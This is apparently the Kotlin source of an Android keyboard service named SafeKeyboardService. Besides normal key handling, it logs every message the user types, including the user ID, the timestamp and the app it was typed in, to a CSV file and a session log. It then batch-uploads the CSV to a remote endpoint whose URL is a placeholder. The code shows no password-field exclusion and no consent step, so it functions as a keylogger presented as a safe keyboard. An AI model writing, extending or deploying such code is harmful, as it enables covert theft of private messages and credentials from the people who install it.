@file:Suppress("DEPRECATION")

package com.business.safekeyboardrezerva

import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*

import android.inputmethodservice.InputMethodService
import android.inputmethodservice.Keyboard
import android.inputmethodservice.KeyboardView
import android.util.Log
import android.view.View
import android.view.inputmethod.InputConnection
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class SafeKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionListener {
    private var isShifted = false
    private var isCapsLock = false
    private var lastShiftTime = 0L

    private var currentKeyboard = KEYBOARD_QWERTY

    private val userId: String by lazy {
        getSharedPreferences("prefs", MODE_PRIVATE)
            .getString("userId", null)
            ?: UUID.randomUUID().also {
                getSharedPreferences("prefs", MODE_PRIVATE)
                    .edit()
                    .putString("userId", it.toString())
                    .apply()
            }.toString()
    }


    private lateinit var keyboardView: KeyboardView
    private lateinit var qwertyKeyboard: Keyboard
    private lateinit var symbolsKeyboard: Keyboard
    private lateinit var extendedSymbolsKeyboard: Keyboard

    private var typedText = StringBuilder()
    private var lastKnownInputFieldText: String = ""

    private val sessionBuffer = StringBuilder()


    // Constants for keyboard types
    companion object {
        private const val KEYBOARD_QWERTY = 0
        private const val KEYBOARD_SYMBOLS = 1
        private const val KEYBOARD_EXTENDED_SYMBOLS = 2
        private const val BATCH_SIZE = 3 // Send after 50 messages
        private const val API_URL = "https://your-api-url.com/endpoint" // Replace with your API URL

    }

    override fun onCreateInputView(): View {
        keyboardView = layoutInflater.inflate(R.layout.keyboard_view, null) as KeyboardView
        qwertyKeyboard = Keyboard(this, R.xml.qwerty)
        symbolsKeyboard = Keyboard(this, R.xml.symbols)
        extendedSymbolsKeyboard = Keyboard(this, R.xml.extended_symbols)

        keyboardView.keyboard = qwertyKeyboard
        keyboardView.setOnKeyboardActionListener(this)
        keyboardView.isPreviewEnabled = false
        return keyboardView
    }

    override fun onKey(primaryCode: Int, keyCodes: IntArray?) {
        val inputConnection = currentInputConnection ?: return

        when (primaryCode) {
            -1 -> { // Shift key
                val currentTime = System.currentTimeMillis()
                if (currentTime - lastShiftTime < 500) { // Double tap detected
                    isCapsLock = !isCapsLock
                    isShifted = isCapsLock
                } else {
                    isShifted = !isShifted
                    isCapsLock = false
                }
                lastShiftTime = currentTime

                // Update keyboard display - this line is causing the issue
                // qwertyKeyboard.isShifted = isShifted

                // Use this approach instead:
                updateShiftKeyAppearance()
                setShifted(isShifted)
                keyboardView.invalidateAllKeys()
            }
            -2 -> { // Symbol key / ABC key
                when (currentKeyboard) {
                    KEYBOARD_QWERTY -> {
                        currentKeyboard = KEYBOARD_SYMBOLS
                        keyboardView.keyboard = symbolsKeyboard
                    }
                    KEYBOARD_SYMBOLS, KEYBOARD_EXTENDED_SYMBOLS -> {
                        currentKeyboard = KEYBOARD_QWERTY
                        keyboardView.keyboard = qwertyKeyboard
                    }
                }
                keyboardView.invalidateAllKeys()
            }
            -3 -> { // More symbols key
                currentKeyboard = KEYBOARD_EXTENDED_SYMBOLS
                keyboardView.keyboard = extendedSymbolsKeyboard
                keyboardView.invalidateAllKeys()
            }
            -4 -> { // Enter key
                inputConnection.commitText("\n", 1)
//                inputConnection.sendKeyEvent(android.view.KeyEvent(android.view.KeyEvent.ACTION_DOWN, android.view.KeyEvent.KEYCODE_ENTER))
//                inputConnection.sendKeyEvent(android.view.KeyEvent(android.view.KeyEvent.ACTION_UP, android.view.KeyEvent.KEYCODE_ENTER))
            }
            -5 -> { // Delete key
                inputConnection.deleteSurroundingText(1, 0)
                if (sessionBuffer.isNotEmpty()) {
                    sessionBuffer.deleteAt(sessionBuffer.length - 1)
                }

                if(typedText.isNotEmpty()){
                    typedText.deleteAt(typedText.length-1)
                }
                lastKnownInputFieldText = inputConnection.getTextBeforeCursor(1000, 0)?.toString() ?: ""
            }
            -6 -> { // Back to numbers (from extended symbols)
                currentKeyboard = KEYBOARD_SYMBOLS
                keyboardView.keyboard = symbolsKeyboard
                keyboardView.invalidateAllKeys()
            }
            else -> {
                var code = primaryCode.toChar()

                // Handle shift for letter keys
                if (isShifted && primaryCode in 97..122) { // 'a' to 'z'
                    code = (primaryCode - 32).toChar()
                    // If not caps lock, reset shift after one character
                    if (!isCapsLock) {
                        isShifted = false
                        updateShiftKeyAppearance()
                        setShifted(false)
                        keyboardView.invalidateAllKeys()
                    }
                }

                inputConnection.commitText(code.toString(), 1)
                typedText.append(code)
                sessionBuffer.append(code)

                // Detect if the input field was cleared by the app
                detectFieldClear(inputConnection)
            }
        }
    }


    private fun detectFieldClear(inputConnection: InputConnection) {
        val currentText = inputConnection.getTextBeforeCursor(1000, 0)?.toString() ?: ""


        /**
         * eeeee
         * e
         */
        if (lastKnownInputFieldText.isNotBlank() && currentText.length < lastKnownInputFieldText.length) {
            // Field was cleared → assume message was sent
            val message = typedText.toString()
            if (message.isNotBlank()) {
                logMessageToCsv(message.substring(0, message.length - 1))
                checkAndSendBatch()
                Log.d("MESSAGE_LOG", "Detected send: $message")
            }
            typedText.clear()
            typedText.append(message.last())
        }

        lastKnownInputFieldText = currentText
    }

    private fun logMessageToCsv(message: String) {
        try {
            val file = File(getExternalFilesDir(null), "messages.csv")
            val isNewFile = !file.exists()
            val writer = FileWriter(file, true)

            if (isNewFile) {
                writer.append("userId,message,timestamp,packageName\n")
            }

            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val packageName = currentInputEditorInfo?.packageName ?: "unknown"
            val app = packageName.split(".").getOrNull(1)
            val escapedMessage = message.replace("\"", "\"\"")
            writer.append("$userId,\"$escapedMessage\",$timestamp,$app\n")
            writer.flush()
            writer.close()
        } catch (e: Exception) {
            Log.e("CSV_LOG", "Failed to write to CSV: ${e.message}")
        }
    }

    private fun checkAndSendBatch() {
        val file = File(getExternalFilesDir(null), "messages.csv")
        if (file.exists()) {
            val lines = file.readLines()
            // Check if we have enough messages (excluding header)
            if (lines.size > BATCH_SIZE) {
                sendMessagesBatch()
            }
        }
    }

    private fun sendMessagesBatch() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(getExternalFilesDir(null), "messages.csv")
                if (!file.exists()) return@launch

                val content = file.readText()
                if(content.split("\n").size < 50)  return@launch
                // Send to API
                val url = URL(API_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/csv")
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(content.toByteArray())
                }

                val responseCode = conn.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Simply clear the file (keep header only)
                    clearCsv()
                } else {
                    Log.e("BATCH_SEND", "Failed to send batch: HTTP $responseCode")
                }
            } catch (e: Exception) {
                Log.e("BATCH_SEND", "Error sending batch: ${e.message}")
            }
        }
    }

    private fun clearCsv() {
        try {
            val file = File(getExternalFilesDir(null), "messages.csv")
            if (file.exists()) {
                // Option 1: Clear contents but keep header
                val writer = FileWriter(file, false)
                writer.append("userId,message,timestamp,packageName\n")
                writer.flush()
                writer.close()

                // Option 2: Delete the file completely
                // file.delete()
            }
        } catch (e: Exception) {
            Log.e("CSV_CLEAR", "Failed to clear CSV: ${e.message}")
        }    }


    private fun updateShiftKeyAppearance() {
        val keyboard = keyboardView.keyboard
        for (key in keyboard.keys) {
            if (key.codes[0] == -1) { // Shift key
                if (isCapsLock) {
                    // Set appearance for caps lock (bold, underlined, or filled)
                    key.label = "⇧̲" // Underlined shift arrow
                    key.icon = null // Remove any icon if using label
                } else if (isShifted) {
                    // Set appearance for shift pressed once
                    key.label = "⇧" // Regular shift arrow but we'll make it visually distinct
                    key.icon = null
                } else {
                    // Set appearance for normal state
                    key.label = "⇧"
                    key.icon = null
                }
                break
            }
        }
    }

    // Improved method to set shifted state for all keys
    private fun setShifted(shifted: Boolean) {
        val keyboard = keyboardView.keyboard
        for (key in keyboard.keys) {
            val code = key.codes[0]
            if (code in 97..122) { // a-z
                key.label = if (shifted) {
                    (code - 32).toChar().toString() // Convert to uppercase
                } else {
                    code.toChar().toString() // Keep as lowercase
                }
            }
        }
    }

    override fun onFinishInputView(finishingInput: Boolean) {
        super.onFinishInputView(finishingInput)
        if (sessionBuffer.isNotEmpty()) {
            appendSessionToFile(sessionBuffer.toString())
            sessionBuffer.clear()
        }
    }

    private fun appendSessionToFile(text: String) {
        try {
            val file = File(applicationContext.filesDir, "keyboard_log.txt")
            file.appendText(text + "\n")
        } catch (e: Exception) {
            Log.e("LOG_FILE", "Failed to write session: ${e.message}")
        }
    }





    override fun onPress(p0: Int) {}
    override fun onRelease(p0: Int) {}
    override fun onText(p0: CharSequence?) {}
    override fun swipeLeft() {}
    override fun swipeRight() {}
    override fun swipeDown() {}
    override fun swipeUp() {}
}